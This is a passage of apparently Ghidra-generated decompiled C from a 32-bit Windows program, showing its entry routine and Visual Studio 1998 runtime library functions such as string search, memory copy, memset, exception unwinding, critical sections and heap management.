             || (DVar5 = FUN_004190c0(uVar1,0,0), DVar5 == 0xffffffff)) goto LAB_004167a6;
        }
      }
      if (((local_11 & 0x48) == 0) && ((param_2 & 8) != 0)) {
        *(byte *)(iVar6 + 4 + (&DAT_00430280)[(int)uVar1 >> 5]) =
             *(byte *)(iVar6 + 4 + (&DAT_00430280)[(int)uVar1 >> 5]) | 0x20;
      }
      FUN_0041abc0(uVar1);
      return uVar1;
    }
    CloseHandle(hFile);
  }
  puVar2 = (undefined *)GetLastError();
  FUN_00418fa0(puVar2);
  FUN_0041abc0(uVar1);
  return 0xffffffff;
}



/* VA 00416860 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void entry(void)

{
  byte bVar1;
  DWORD DVar2;
  int iVar3;
  HMODULE pHVar4;
  UINT UVar5;
  byte extraout_CL;
  byte *pbVar6;
  undefined4 *unaff_FS_OFFSET;
  _STARTUPINFOA local_60;
  undefined1 *local_1c;
  undefined4 local_14;
  undefined1 *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  byte *pbVar7;

  local_8 = 0xffffffff;
  puStack_c = &DAT_00428028;
  puStack_10 = &LAB_00416fd0;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  local_1c = &stack0xffffff88;
  DVar2 = GetVersion();
  _DAT_0042ec70 = DVar2 >> 8 & 0xff;
  _DAT_0042ec6c = DVar2 & 0xff;
  _DAT_0042ec68 = _DAT_0042ec6c * 0x100 + _DAT_0042ec70;
  _DAT_0042ec64 = DVar2 >> 0x10;
  iVar3 = FUN_004170b0();
  if (iVar3 == 0) {
    __amsg_exit(0x1c);
  }
  iVar3 = FUN_004194b0();
  if (iVar3 == 0) {
    __amsg_exit(0x10);
  }
  local_8 = 0;
  FUN_0041abf0();
  FUN_0041a6f0();
  DAT_004313b0 = (byte *)GetCommandLineA();
  DAT_0042ecc4 = FUN_0041b7d0();
  if ((DAT_0042ecc4 == (LPSTR)0x0) || (DAT_004313b0 == (byte *)0x0)) {
    FUN_00415820(0xffffffff);
  }
  FUN_0041b520();
  FUN_0041b430();
  FUN_004157f0();
  pbVar6 = DAT_004313b0;
  if (*DAT_004313b0 == 0x22) {
    while( true ) {
      pbVar7 = pbVar6;
      pbVar6 = pbVar7 + 1;
      bVar1 = *pbVar6;
      if ((bVar1 == 0x22) || (bVar1 == 0)) break;
      iVar3 = FUN_0041b3d0((uint)bVar1);
      if (iVar3 != 0) {
        pbVar6 = pbVar7 + 2;
      }
    }
    if (*pbVar6 == 0x22) {
      pbVar6 = pbVar7 + 2;
    }
  }
  else {
    for (; 0x20 < *pbVar6; pbVar6 = pbVar6 + 1) {
    }
  }
  for (; (*pbVar6 != 0 && (*pbVar6 < 0x21)); pbVar6 = pbVar6 + 1) {
  }
  local_60.dwFlags = 0;
  GetStartupInfoA(&local_60);
  pHVar4 = GetModuleHandleA((LPCSTR)0x0);
  UVar5 = FUN_0040ce40(extraout_CL,(undefined *)pHVar4);
  FUN_00415820(UVar5);
  *unaff_FS_OFFSET = local_14;
  return;
}



/* VA 00416a10 */

/* Library Function - Single Match
    __amsg_exit

   Library: Visual Studio 1998 Release */

void __cdecl __amsg_exit(int param_1)

{
  if (DAT_0042eccc == 1) {
    FUN_0041b930();
  }
  FUN_0041b970(param_1);
  (*(code *)PTR___exit_0042ade0)(0xff);
  return;
}



/* VA 00416a40 */

/* Library Function - Single Match
    _strlen

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

size_t __cdecl _strlen(char *_Str)

{
  uint uVar1;
  uint *puVar2;
  uint *puVar3;

  puVar2 = (uint *)_Str;
  do {
    if (((uint)puVar2 & 3) == 0) goto LAB_00416a60;
    uVar1 = *puVar2;
    puVar2 = (uint *)((int)puVar2 + 1);
  } while ((char)uVar1 != '\0');
LAB_00416a93:
  return (size_t)((int)puVar2 + (-1 - (int)_Str));
LAB_00416a60:
  do {
    do {
      puVar3 = puVar2;
      puVar2 = puVar3 + 1;
    } while (((*puVar3 ^ 0xffffffff ^ *puVar3 + 0x7efefeff) & 0x81010100) == 0);
    uVar1 = *puVar3;
    if ((char)uVar1 == '\0') {
      return (int)puVar3 - (int)_Str;
    }
    if ((char)(uVar1 >> 8) == '\0') {
      return (size_t)((int)puVar3 + (1 - (int)_Str));
    }
    if ((uVar1 & 0xff0000) == 0) {
      return (size_t)((int)puVar3 + (2 - (int)_Str));
    }
  } while ((uVar1 & 0xff000000) != 0);
  goto LAB_00416a93;
}



/* VA 00416ac0 */

/* Library Function - Single Match
    _strstr

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

char * __cdecl _strstr(char *_Str,char *_SubStr)

{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  char cVar5;
  uint uVar6;
  uint uVar7;
  char *pcVar8;
  uint *puVar9;
  char *pcVar10;

  cVar3 = *_SubStr;
  if (cVar3 == '\0') {
    return _Str;
  }
  if (_SubStr[1] == '\0') {
    while (((uint)_Str & 3) != 0) {
      uVar4 = *(uint *)_Str;
      if ((char)uVar4 == cVar3) {
        return (char *)(uint *)_Str;
      }
      _Str = (char *)((int)_Str + 1);
      if ((char)uVar4 == '\0') {
        return (char *)0x0;
      }
    }
    while( true ) {
      while( true ) {
        uVar4 = *(uint *)_Str;
        uVar7 = uVar4 ^ CONCAT22(CONCAT11(cVar3,cVar3),CONCAT11(cVar3,cVar3));
        uVar6 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;
        puVar9 = (uint *)((int)_Str + 4);
        if (((uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff) & 0x81010100) != 0) break;
        _Str = (char *)puVar9;
        if ((uVar6 & 0x81010100) != 0) {
          if ((uVar6 & 0x1010100) != 0) {
            return (char *)0x0;
          }
          if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {
            return (char *)0x0;
          }
        }
      }
      uVar4 = *(uint *)_Str;
      if ((char)uVar4 == cVar3) {
        return (char *)(uint *)_Str;
      }
      if ((char)uVar4 == '\0') {
        return (char *)0x0;
      }
      cVar5 = (char)(uVar4 >> 8);
      if (cVar5 == cVar3) {
        return (char *)((int)_Str + 1);
      }
      if (cVar5 == '\0') {
        return (char *)0x0;
      }
      cVar5 = (char)(uVar4 >> 0x10);
      if (cVar5 == cVar3) {
        return (char *)((int)_Str + 2);
      }
      if (cVar5 == '\0') break;
      cVar5 = (char)(uVar4 >> 0x18);
      if (cVar5 == cVar3) {
        return (char *)((int)_Str + 3);
      }
      _Str = (char *)puVar9;
      if (cVar5 == '\0') {
        return (char *)0x0;
      }
    }
    return (char *)0x0;
  }
  do {
    cVar5 = *_Str;
    do {
      while (_Str = _Str + 1, cVar5 != cVar3) {
        if (cVar5 == '\0') {
          return (char *)0x0;
        }
        cVar5 = *_Str;
      }
      cVar5 = *_Str;
      pcVar10 = _Str + 1;
      pcVar8 = _SubStr;
    } while (cVar5 != _SubStr[1]);
    do {
      if (pcVar8[2] == '\0') {
LAB_00416b33:
        return _Str + -1;
      }
      if (*pcVar10 != pcVar8[2]) break;
      pcVar1 = pcVar8 + 3;
      if (*pcVar1 == '\0') goto LAB_00416b33;
      pcVar2 = pcVar10 + 1;
      pcVar8 = pcVar8 + 2;
      pcVar10 = pcVar10 + 2;
    } while (*pcVar1 == *pcVar2);
  } while( true );
}



/* VA 00416b40 */

undefined4 * __cdecl FUN_00416b40(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;

  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar1 = param_3 >> 2;
      uVar2 = param_3 & 3;
      if (7 < uVar1) {
        for (; uVar1 != 0; uVar1 = uVar1 - 1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar2) {
        case 0:
          return param_1;
        case 2:
          goto switchD_00416cf7_caseD_2;
        case 3:
          goto switchD_00416cf7_caseD_3;
        }
        goto switchD_00416cf7_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_00416cf7_caseD_0;
      case 1:
        goto switchD_00416cf7_caseD_1;
      case 2:
        goto switchD_00416cf7_caseD_2;
      case 3:
        goto switchD_00416cf7_caseD_3;
      default:
        uVar1 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar2 = uVar1 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
          puVar3 = (undefined4 *)((int)puVar3 + -1);
          uVar1 = uVar1 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00416cf7_caseD_2;
            case 3:
              goto switchD_00416cf7_caseD_3;
            }
            goto switchD_00416cf7_caseD_1;
          }
          break;
        case 2:
          uVar2 = uVar1 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
          uVar1 = uVar1 >> 2;
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
          puVar3 = (undefined4 *)((int)puVar3 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00416cf7_caseD_2;
            case 3:
              goto switchD_00416cf7_caseD_3;
            }
            goto switchD_00416cf7_caseD_1;
          }
          break;
        case 3:
          uVar2 = uVar1 & 3;
          *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
          *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
          uVar1 = uVar1 >> 2;
          *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar3 + 1);
          puVar3 = (undefined4 *)((int)puVar3 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_00416cf7_caseD_2;
            case 3:
              goto switchD_00416cf7_caseD_3;
            }
            goto switchD_00416cf7_caseD_1;
          }
        }
      }
    }
    switch(uVar1) {
    case 7:
      puVar4[7 - uVar1] = puVar3[7 - uVar1];
    case 6:
      puVar4[6 - uVar1] = puVar3[6 - uVar1];
    case 5:
      puVar4[5 - uVar1] = puVar3[5 - uVar1];
    case 4:
      puVar4[4 - uVar1] = puVar3[4 - uVar1];
    case 3:
      puVar4[3 - uVar1] = puVar3[3 - uVar1];
    case 2:
      puVar4[2 - uVar1] = puVar3[2 - uVar1];
    case 1:
      puVar4[1 - uVar1] = puVar3[1 - uVar1];
      puVar3 = puVar3 + -uVar1;
      puVar4 = puVar4 + -uVar1;
    }
    switch(uVar2) {
    case 1:
switchD_00416cf7_caseD_1:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
      return param_1;
    case 2:
switchD_00416cf7_caseD_2:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
      return param_1;
    case 3:
switchD_00416cf7_caseD_3:
      *(undefined1 *)((int)puVar4 + 3) = *(undefined1 *)((int)puVar3 + 3);
      *(undefined1 *)((int)puVar4 + 2) = *(undefined1 *)((int)puVar3 + 2);
      *(undefined1 *)((int)puVar4 + 1) = *(undefined1 *)((int)puVar3 + 1);
      return param_1;
    }
switchD_00416cf7_caseD_0:
    return param_1;
  }
  puVar3 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar1 = param_3 >> 2;
    uVar2 = param_3 & 3;
    if (7 < uVar1) {
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *param_2;
        param_2 = param_2 + 1;
        puVar3 = puVar3 + 1;
      }
      switch(uVar2) {
      case 0:
        return param_1;
      case 2:
        goto switchD_00416b75_caseD_2;
      case 3:
        goto switchD_00416b75_caseD_3;
      }
      goto switchD_00416b75_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_00416b75_caseD_0;
    case 1:
      goto switchD_00416b75_caseD_1;
    case 2:
      goto switchD_00416b75_caseD_2;
    case 3:
      goto switchD_00416b75_caseD_3;
    default:
      uVar1 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar2 = uVar1 & 3;
        *(undefined1 *)param_1 = *(undefined1 *)param_2;
        *(undefined1 *)((int)param_1 + 1) = *(undefined1 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        *(undefined1 *)((int)param_1 + 2) = *(undefined1 *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar3 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_00416b75_caseD_2;
          case 3:
            goto switchD_00416b75_caseD_3;
          }
          goto switchD_00416b75_caseD_1;
        }
        break;
      case 2:
        uVar2 = uVar1 & 3;
        *(undefined1 *)param_1 = *(undefined1 *)param_2;
        uVar1 = uVar1 >> 2;
        *(undefined1 *)((int)param_1 + 1) = *(undefined1 *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar3 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_00416b75_caseD_2;
          case 3:
            goto switchD_00416b75_caseD_3;
          }
          goto switchD_00416b75_caseD_1;
        }
        break;
      case 3:
        uVar2 = uVar1 & 3;
        *(undefined1 *)param_1 = *(undefined1 *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        puVar3 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_00416b75_caseD_2;
          case 3:
            goto switchD_00416b75_caseD_3;
          }
          goto switchD_00416b75_caseD_1;
        }
      }
    }
  }
  switch(uVar1) {
  case 7:
    puVar3[uVar1 - 7] = param_2[uVar1 - 7];
  case 6:
    puVar3[uVar1 - 6] = param_2[uVar1 - 6];
  case 5:
    puVar3[uVar1 - 5] = param_2[uVar1 - 5];
  case 4:
    puVar3[uVar1 - 4] = param_2[uVar1 - 4];
  case 3:
    puVar3[uVar1 - 3] = param_2[uVar1 - 3];
  case 2:
    puVar3[uVar1 - 2] = param_2[uVar1 - 2];
  case 1:
    puVar3[uVar1 - 1] = param_2[uVar1 - 1];
    param_2 = param_2 + uVar1;
    puVar3 = puVar3 + uVar1;
  }
  switch(uVar2) {
  case 1:
switchD_00416b75_caseD_1:
    *(undefined1 *)puVar3 = *(undefined1 *)param_2;
    return param_1;
  case 2:
switchD_00416b75_caseD_2:
    *(undefined1 *)puVar3 = *(undefined1 *)param_2;
    *(undefined1 *)((int)puVar3 + 1) = *(undefined1 *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_00416b75_caseD_3:
    *(undefined1 *)puVar3 = *(undefined1 *)param_2;
    *(undefined1 *)((int)puVar3 + 1) = *(undefined1 *)((int)param_2 + 1);
    *(undefined1 *)((int)puVar3 + 2) = *(undefined1 *)((int)param_2 + 2);
    return param_1;
  }
switchD_00416b75_caseD_0:
  return param_1;
}



/* VA 00416e80 */

/* Library Function - Single Match
    _memset

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release */

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  uint uVar2;
  size_t sVar3;
  uint *puVar4;

  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  puVar4 = _Dst;
  if (3 < _Size) {
    uVar2 = -(int)_Dst & 3;
    sVar3 = _Size;
    if (uVar2 != 0) {
      sVar3 = _Size - uVar2;
      do {
        *(undefined1 *)puVar4 = (undefined1)_Val;
        puVar4 = (uint *)((int)puVar4 + 1);
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar3 & 3;
    uVar2 = sVar3 >> 2;
    if (uVar2 != 0) {
      for (; uVar2 != 0; uVar2 = uVar2 - 1) {
        *puVar4 = uVar1;
        puVar4 = puVar4 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar4 = (char)uVar1;
    puVar4 = (uint *)((int)puVar4 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



/* VA 00416ed8 */

/* Library Function - Single Match
    __global_unwind2

   Library: Visual Studio */

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x416ef0,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



/* VA 00416f1a */

/* Library Function - Single Match
    __local_unwind2

   Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release, Visual Studio 2003 Debug, Visual
   Studio 2003 Release */

void __cdecl __local_unwind2(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *unaff_FS_OFFSET;
  undefined4 uStack_1c;
  undefined1 *puStack_18;
  undefined4 local_14;
  int iStack_10;

  iStack_10 = param_1;
  puStack_18 = &LAB_00416ef8;
  uStack_1c = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &uStack_1c;
  while( true ) {
    iVar1 = *(int *)(param_1 + 8);
    iVar2 = *(int *)(param_1 + 0xc);
    if ((iVar2 == -1) || (iVar2 == param_2)) break;
    local_14 = *(undefined4 *)(iVar1 + iVar2 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_14;
    if (*(int *)(iVar1 + 4 + iVar2 * 0xc) == 0) {
      FUN_00416fae();
      (**(code **)(iVar1 + 8 + iVar2 * 0xc))();
    }
  }
  *unaff_FS_OFFSET = uStack_1c;
  return;
}



/* VA 00416fae */

void FUN_00416fae(void)

{
  undefined4 in_EAX;
  int unaff_EBP;

  DAT_0042adf8 = *(undefined4 *)(unaff_EBP + 8);
  DAT_0042adf4 = in_EAX;
  DAT_0042adfc = unaff_EBP;
  return;
}



/* VA 0041708d */

void FUN_0041708d(int param_1)

{
  __local_unwind2(*(int *)(param_1 + 0x18),*(int *)(param_1 + 0x1c));
  return;
}



/* VA 004170b0 */

undefined4 FUN_004170b0(void)

{
  undefined **ppuVar1;

  DAT_004313ac = HeapCreate(0,0x1000,0);
  if (DAT_004313ac == (HANDLE)0x0) {
    return 0;
  }
  ppuVar1 = FUN_004172a0();
  if (ppuVar1 == (undefined **)0x0) {
    HeapDestroy(DAT_004313ac);
    return 0;
  }
  return 1;
}



/* VA 004170f0 */

void FUN_004170f0(void)

{
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_0042ae4c);
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_0042ae3c);
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_0042ae2c);
  InitializeCriticalSection((LPCRITICAL_SECTION)PTR_DAT_0042ae0c);
  return;
}



/* VA 00417120 */

void __cdecl FUN_00417120(int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;

  if (*(int *)(&DAT_0042ae08 + param_1 * 4) == 0) {
    lpCriticalSection = (LPCRITICAL_SECTION)FUN_00414db0(0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      __amsg_exit(0x11);
    }
    FUN_00417120(0x11);
    if (*(int *)(&DAT_0042ae08 + param_1 * 4) == 0) {
      InitializeCriticalSection(lpCriticalSection);
      *(LPCRITICAL_SECTION *)(&DAT_0042ae08 + param_1 * 4) = lpCriticalSection;
    }
    else {
      FUN_00414d40((undefined *)lpCriticalSection);
    }
    FUN_004171a0(0x11);
  }
  EnterCriticalSection(*(LPCRITICAL_SECTION *)(&DAT_0042ae08 + param_1 * 4));
  return;
}



/* VA 004171a0 */

void __cdecl FUN_004171a0(int param_1)

{
  LeaveCriticalSection(*(LPCRITICAL_SECTION *)(&DAT_0042ae08 + param_1 * 4));
  return;
}



/* VA 004171c0 */

void __cdecl FUN_004171c0(uint param_1)

{
  if ((0x42d1bf < param_1) && (param_1 < 0x42d421)) {
    FUN_00417120(((int)(param_1 - 0x42d1c0) >> 5) + 0x1c);
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x20));
  return;
}



/* VA 00417200 */

void __cdecl FUN_00417200(int param_1,int param_2)

{
  if (param_1 < 0x14) {
    FUN_00417120(param_1 + 0x1c);
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(param_2 + 0x20));
  return;
}



/* VA 00417230 */

void __cdecl FUN_00417230(uint param_1)

{
  if ((0x42d1bf < param_1) && (param_1 < 0x42d421)) {
    FUN_004171a0(((int)(param_1 - 0x42d1c0) >> 5) + 0x1c);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x20));
  return;
}



/* VA 00417270 */

void __cdecl FUN_00417270(int param_1,int param_2)

{
  if (param_1 < 0x14) {
    FUN_004171a0(param_1 + 0x1c);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_2 + 0x20));
  return;
}



/* VA 004172a0 */

undefined ** FUN_004172a0(void)

{
  bool bVar1;
  undefined4 *lpAddress;
  LPVOID pvVar2;
  int iVar3;
  undefined **ppuVar4;
  undefined **lpMem;
  undefined4 *puVar5;

  if (DAT_0042aed8 == -1) {
    lpMem = &PTR_LOOP_0042aec8;
  }
  else {
    lpMem = HeapAlloc(DAT_004313ac,0,0x2020);
    if (lpMem == (undefined **)0x0) {
      return (undefined **)0x0;
    }
  }
  lpAddress = VirtualAlloc((LPVOID)0x0,0x400000,0x2000,4);
  if (lpAddress != (undefined4 *)0x0) {
    pvVar2 = VirtualAlloc(lpAddress,0x10000,0x1000,4);
    if (pvVar2 != (LPVOID)0x0) {
      if (lpMem == &PTR_LOOP_0042aec8) {
        if (PTR_LOOP_0042aec8 == (undefined *)0x0) {
          PTR_LOOP_0042aec8 = (undefined *)&PTR_LOOP_0042aec8;
        }
        if (PTR_LOOP_0042aecc == (undefined *)0x0) {
          PTR_LOOP_0042aecc = (undefined *)&PTR_LOOP_0042aec8;
        }
      }
      else {
        *lpMem = (undefined *)&PTR_LOOP_0042aec8;
        lpMem[1] = PTR_LOOP_0042aecc;
        PTR_LOOP_0042aecc = (undefined *)lpMem;
        *(undefined ***)lpMem[1] = lpMem;
      }
      lpMem[5] = (undefined *)(lpAddress + 0x100000);
      lpMem[4] = (undefined *)lpAddress;
      lpMem[2] = (undefined *)(lpMem + 6);
      lpMem[3] = (undefined *)(lpMem + 0x26);
      iVar3 = 0;
      ppuVar4 = lpMem + 6;
      do {
        bVar1 = 0xf < iVar3;
        iVar3 = iVar3 + 1;
        *ppuVar4 = (undefined *)((bVar1 - 1 & 0xf1) - 1);
        ppuVar4[1] = (undefined *)0xf1;
        ppuVar4 = ppuVar4 + 2;
      } while (iVar3 < 0x400);
      puVar5 = lpAddress;
      for (iVar3 = 0x4000; iVar3 != 0; iVar3 = iVar3 + -1) {
        *puVar5 = 0;
        puVar5 = puVar5 + 1;
      }
      if (lpAddress < lpMem[4] + 0x10000) {
        do {
          lpAddress[1] = 0xf0;
          *lpAddress = lpAddress + 2;
          *(undefined1 *)(lpAddress + 0x3e) = 0xff;
          lpAddress = lpAddress + 0x400;
        } while (lpAddress < lpMem[4] + 0x10000);
      }
      return lpMem;
    }
    VirtualFree(lpAddress,0,0x8000);
  }
  if (lpMem != &PTR_LOOP_0042aec8) {
    HeapFree(DAT_004313ac,0,lpMem);
  }
  return (undefined **)0x0;
}



/* VA 00417410 */

void __cdecl FUN_00417410(undefined **param_1)

{
  VirtualFree(param_1[4],0,0x8000);
  if ((undefined **)PTR_LOOP_0042cee8 == param_1) {
    PTR_LOOP_0042cee8 = param_1[1];
  }
  if (param_1 != &PTR_LOOP_0042aec8) {
    *(undefined **)param_1[1] = *param_1;
    *(undefined **)(*param_1 + 4) = param_1[1];
    HeapFree(DAT_004313ac,0,param_1);
    return;
  }
  DAT_0042aed8 = 0xffffffff;
  return;
}



/* VA 00417470 */

void __cdecl FUN_00417470(int param_1)

{
  BOOL BVar1;
  undefined **ppuVar2;
  int iVar3;
  int iVar4;
  undefined **ppuVar5;
  undefined **ppuVar6;

  ppuVar6 = (undefined **)PTR_LOOP_0042aecc;
  do {
    ppuVar5 = ppuVar6;
    if (ppuVar6[4] != (undefined *)0xffffffff) {
      iVar4 = 0;
      ppuVar5 = ppuVar6 + 0x804;
      iVar3 = 0x3ff000;
      do {
        if (*ppuVar5 == (undefined *)0xf0) {
          BVar1 = VirtualFree(ppuVar6[4] + iVar3,0x1000,0x4000);
          if (BVar1 != 0) {
            *ppuVar5 = (undefined *)0xffffffff;
            DAT_0042ed30 = DAT_0042ed30 + -1;
            if (((undefined **)ppuVar6[3] == (undefined **)0x0) || (ppuVar5 < ppuVar6[3])) {
              ppuVar6[3] = (undefined *)ppuVar5;
            }
            iVar4 = iVar4 + 1;
            param_1 = param_1 + -1;
            if (param_1 == 0) break;
          }
        }
        iVar3 = iVar3 + -0x1000;
        ppuVar5 = ppuVar5 + -2;
      } while (-1 < iVar3);
      ppuVar5 = (undefined **)ppuVar6[1];
      if ((iVar4 != 0) && (ppuVar6[6] == (undefined *)0xffffffff)) {
        iVar3 = 1;
        ppuVar2 = ppuVar6 + 8;
        do {
          if (*ppuVar2 != (undefined *)0xffffffff) break;
          iVar3 = iVar3 + 1;
          ppuVar2 = ppuVar2 + 2;
        } while (iVar3 < 0x400);
        if (iVar3 == 0x400) {
          FUN_00417410(ppuVar6);
        }
      }
    }
    if ((ppuVar5 == (undefined **)PTR_LOOP_0042aecc) || (ppuVar6 = ppuVar5, param_1 < 1)) {
      return;
    }
  } while( true );
}



/* VA 00417540 */

int __cdecl FUN_00417540(undefined *param_1,undefined4 *param_2,uint *param_3)

{
  undefined **ppuVar1;
  uint uVar2;

  ppuVar1 = &PTR_LOOP_0042aec8;
  while ((param_1 <= ppuVar1[4] || (ppuVar1[5] <= param_1))) {
    ppuVar1 = (undefined **)*ppuVar1;
    if (ppuVar1 == &PTR_LOOP_0042aec8) {
      return 0;
    }
  }
  if (((uint)param_1 & 0xf) != 0) {
    return 0;
  }
  if (((uint)param_1 & 0xfff) < 0x100) {
    return 0;
  }
  *param_2 = ppuVar1;
  uVar2 = (uint)param_1 & 0xfffff000;
  *param_3 = uVar2;
  return ((int)(param_1 + (-0x100 - uVar2)) >> 4) + 8 + uVar2;
}



/* VA 004175a0 */

void __cdecl FUN_004175a0(int param_1,int param_2,byte *param_3)

{
  int *piVar1;
  int iVar2;

  iVar2 = param_2 - *(int *)(param_1 + 0x10) >> 0xc;
  piVar1 = (int *)(param_1 + 0x18 + iVar2 * 8);
  *piVar1 = *(int *)(param_1 + 0x18 + iVar2 * 8) + (uint)*param_3;
  *param_3 = 0;
  piVar1[1] = 0xf1;
  if ((*piVar1 == 0xf0) && (DAT_0042ed30 = DAT_0042ed30 + 1, DAT_0042ed30 == 0x20)) {
    FUN_00417470(0x10);
  }
  return;
}



/* VA 00417600 */

int * __cdecl FUN_00417600(uint param_1)

{
  undefined **ppuVar1;
  uint *puVar2;
  undefined **ppuVar3;
  undefined *puVar4;
  int *piVar5;
  undefined **ppuVar6;
  undefined **ppuVar7;
  int *piVar8;
  int iVar9;
  uint *puVar10;
  int *piVar11;
  bool bVar12;

  piVar11 = (int *)PTR_LOOP_0042cee8;
  do {
    if (piVar11[4] != -1) {
      puVar10 = (uint *)piVar11[2];
      piVar8 = (int *)(((int)puVar10 + (-0x18 - (int)piVar11) >> 3) * 0x1000 + piVar11[4]);
      for (; puVar10 < piVar11 + 0x806; puVar10 = puVar10 + 2) {
        if (((int)param_1 <= (int)*puVar10) && (param_1 < puVar10[1])) {
          piVar5 = (int *)FUN_00417840(piVar8,*puVar10,param_1);
          if (piVar5 != (int *)0x0) {
            PTR_LOOP_0042cee8 = (undefined *)piVar11;
            *puVar10 = *puVar10 - param_1;
            piVar11[2] = (int)puVar10;
            return piVar5;
          }
          puVar10[1] = param_1;
        }
        piVar8 = piVar8 + 0x400;
      }
      puVar2 = (uint *)piVar11[2];
      piVar8 = (int *)piVar11[4];
      for (puVar10 = (uint *)(piVar11 + 6); puVar10 < puVar2; puVar10 = puVar10 + 2) {
        if (((int)param_1 <= (int)*puVar10) && (param_1 < puVar10[1])) {
